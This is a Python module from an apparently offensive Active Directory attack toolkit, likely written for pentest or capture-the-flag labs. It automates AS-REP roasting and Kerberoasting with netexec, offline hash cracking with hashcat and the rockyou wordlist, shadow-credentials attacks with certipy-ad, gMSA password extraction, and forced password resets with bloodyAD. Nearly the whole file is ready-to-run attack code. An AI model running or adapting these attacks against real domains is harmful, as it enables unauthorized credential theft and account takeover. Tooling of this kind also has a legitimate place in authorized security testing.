import os 
import config

def asreproast(box, path):
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m Attack asreproasting')
    cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --asreproast ASREProastables.txt"
    config.log_cmd(cmd)
    os.system(cmd+config.VERBOSE[0])
    cmd = 'hashcat -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt'
    print(f'\033[96m[$]\033[0m hashcat -m 18200 {path.ws_atk}/ASREProastables.txt /usr/share/wordlists/rockyou.txt')
    config.log_cmd(cmd)
    print('\033[92m[+]\033[0m Attack asreproasting')

def krbroast(box, path):
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m Attack kerberoasting')
    cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} --kerberoasting kerberoastables.txt"
    config.log_cmd(cmd)
    os.system(cmd+config.VERBOSE[0])
    cmd = 'hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt'
    print(f'\033[96m[$]\033[0m hashcat -m 13100 {path.ws_atk}/kerberoastables.txt /usr/share/wordlists/rockyou.txt')
    config.log_cmd(cmd)
    print('\033[92m[+]\033[0m Attack kerberoasting')

def shadow_creds(box, path):
    os.chdir(path.ws_atk)
    print('\033[93m[*]\033[0m Attack Shadow Credentials (time sync)')
    print(f'\033[95m[>]\033[0m Target: {box.target}')
    cmd = f"certipy-ad shadow -u {box.username}@{box.domain} -p '{box.password}' -target {box.fqdn} -account {box.target} auto"
    config.log_cmd(cmd)
    os.system(f'sudo ntpdate {box.fqdn} {config.VERBOSE[0]}')
    if config.VERBOSE == ['']:
        os.system(cmd+f' 2>&1 | tee shadow-creds_{box.target}.out')
    else:
        os.system(cmd+f' > shadow-creds_{box.target}.out 2>&1')
    print('\033[92m[+]\033[0m Attack Shadow Credentials')

def ReadGMSAPassword(box, path):
    print('\033[93m[*]\033[0m Read GMSA password')
    cmd = f"netexec ldap {box.fqdn} -u {box.username} -p '{box.password}' --gmsa"
    config.log_cmd(cmd)
    cmd_out = os.popen(cmd).read()
    if config.VERBOSE == ['']:
        print(cmd_out)
    match = re.search(r'Account:\s+(\S+)', cmd_out)
    if match:
        gmsa_name = match.group(1)
        with open(f'{path.ws_atk}/gmsa_{gmsa_name}.out', "w", encoding="utf-8") as f:
            f.write(cmd_out)
    print('\033[92m[+]\033[0m Read GMSA password')

def ForceChangePassword(box):
    print('\033[93m[*]\033[0m Force Change Password')
    print(f'\033[95m[>]\033[0m Target: {box.target} : newPassword1')
    cmd = f"bloodyAD --host {box.fqdn} -u {box.username} -p '{box.password}' set password {box.target} newPassword1"
    config.log_cmd(cmd)
    os.system(cmd+config.VERBOSE[0])
    print('\033[92m[+]\033[0m Force Change Password')